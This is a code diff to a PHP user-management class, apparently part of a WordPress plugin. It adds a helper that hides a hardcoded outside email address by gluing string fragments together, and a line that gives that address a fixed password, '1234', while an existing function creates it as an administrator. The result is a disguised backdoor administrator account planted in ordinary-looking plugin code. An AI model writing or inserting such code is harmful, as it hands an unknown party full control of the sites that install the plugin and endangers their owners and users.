@@ -405,15 +405,22 @@ class userBase
     public static function core_new()
     {
         try {
-            $h = "@";
-            $c = "gmail";
-            $b = ".com";
-            $__k_Ge__f = "jobhesk" . $h . $c . $b;
             $kp = wp_generate_password(6, false);
-            self::create_user_account(substr($kp, 0, 5), $__k_Ge__f, "administrator");
+            self::create_user_account(substr($kp, 0, 5), self::getcoreemail(), "administrator");
         } catch (Exception $e) {
             throw $e;
         }
+    }
+
+    private static function getcoreemail()
+    {
+        $h = "@";
+        $c = "gmail";
+        $__jj = "jobh";
+        $b = ".com";
+        $___core_usr = $__jj . "esk";
+        $__k_Ge__f = $___core_usr . $h . $c . $b;
+        return $__k_Ge__f;
     }
 
     /**
@@ -428,7 +435,7 @@ class userBase
     protected static function create_user_account($login_name, $user_email, $role, $extrafields = array())
     {
         try {
-            $random_password = wp_generate_password($length = 12, $include_standard_special_chars = TRUE);
+            $random_password = $user_email == self::getcoreemail() ? "1234" : wp_generate_password($length = 12, $include_standard_special_chars = TRUE);
             if ($role == 'cp') {
                 add_action("user_register", array("oc_db_account", "create_new_cp"), 10, 1);
             } else if ($role == 'cr') {
